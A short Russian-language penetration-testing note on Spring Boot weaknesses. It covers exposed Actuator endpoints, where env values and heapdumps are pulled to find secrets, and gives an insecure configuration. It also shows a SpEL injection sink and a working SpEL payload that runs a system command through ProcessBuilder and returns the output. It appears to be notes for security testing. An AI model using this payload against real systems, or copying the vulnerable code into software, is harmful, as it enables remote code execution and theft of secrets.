# Spring Boot

Уязвимости в Spring Boot [https://github.com/pyn3rd/Spring-Boot-Vulnerability](https://github.com/pyn3rd/Spring-Boot-Vulnerability)

## Spring Boot Actuator

Spring Boot Actuator — на сколько понял, это инструмент/фреймворк для отслеживания состояния приложения. Вот простой  пример уязвимого приложения: [https://github.com/veracode-research/actuator-testbed](https://github.com/veracode-research/actuator-testbed)

Статья к этому приложению: [https://www.veracode.com/blog/research/exploiting-spring-boot-actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Actuator API: [https://docs.spring.io/spring-boot/docs/2.0.x/actuator-api/html/](https://docs.spring.io/spring-boot/docs/2.0.x/actuator-api/html/)

Из env можем достать env'ы приложения. Из heapdump скачиваем дамп процесса и с помощью VisualVM ищем секреты.

В зависимости от данных, за это могут накинуть порядочно: [https://hackerone.com/reports/1022048](https://hackerone.com/reports/1022048)

В общем, если в actuator включено все, конечно, это можно запавнить, но по умолчанию это все отключено. Пример небезопасной конфигурации в `application.properties`:

```
management.endpoint.env.post.enabled=true
management.endpoint.restart.enabled=true
endpoints.sensitive=true
endpoints.actuator.enabled=true
management.security.enabled=false 
management.endpoints.web.exposure.include=*
```

## Spring Expression Language (SpEL)

The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime.

Доступ к этой функциональности приводит к удаленному исполнению кода. Пример уязвимого кода:

```java
@Data
@Builder
class MyClass {
    private String inp;
    
    boolean vulnFunction(Object object) {
        return (boolean)new SpelExpressionParser().parseExpression(inp).getValue(new StandardEvaluationContext(object));
    }
}
```

Пример выполнения `whoami /all`

```
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("var pb = new java.lang.ProcessBuilder['(java.lang.String[])']([ 'cmd', '/c', 'whoami /all', ]); pb.redirectErrorStream(true); var p = pb.start(); var stdout = new java.io.BufferedReader( new java.io.InputStreamReader(p.getInputStream())); var s = '_'; while ((line = stdout.readLine()) != null) { s += line + '\n'; } s;").getBytes(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())==0
```
